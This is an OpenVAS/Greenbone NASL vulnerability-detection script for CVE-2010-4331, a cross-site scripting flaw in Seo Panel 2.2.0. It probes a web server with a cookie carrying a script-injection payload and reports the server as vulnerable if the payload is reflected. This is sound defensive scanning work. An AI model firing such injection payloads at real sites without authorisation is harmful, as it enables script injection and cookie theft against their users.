# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801775");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-04-26 15:24:49 +0200 (Tue, 26 Apr 2011)");
  script_cve_id("CVE-2010-4331");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Seo Panel Multiple Cross-site Scripting (XSS) Vulnerabilities");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64725");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45828");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/16000/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/515768/100/0/threaded");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input by the 'index.ctrl.php' or 'controllers/settings.ctrl.php' scripts. A
  remote attacker could exploit this vulnerability using the default_news or
  sponsors parameter to inject malicious script content into a web page.");

  script_tag(name:"solution", value:"Upgrade to version 2.2.0 or later.");

  script_tag(name:"summary", value:"Seo Panel is prone to multiple Cross- site scripting vulnerabilities.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session in the context of an
  affected site and potentially allowing the attacker to steal cookie-based
  authentication credentials or to control how the site is rendered to the user.");

  script_tag(name:"affected", value:"Seo Panel version 2.2.0.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);
if(!http_can_host_php(port:port))
  exit(0);

host = http_host_name(port:port);

foreach dir(make_list_unique("/seopanel", "/SeoPanel", "/", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";

  res = http_get_cache(item:dir + "/", port:port);

  if('<title>Seo Panel' >< res) {
    url = dir + "/index.php?sec=news";
    req = string("GET ", url," HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Cookie: default_news=<script>alert('XSS-TEST')</script>", "\r\n\r\n");
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && "<script>alert('XSS-TEST')</script>" >< res){
      report = http_report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);
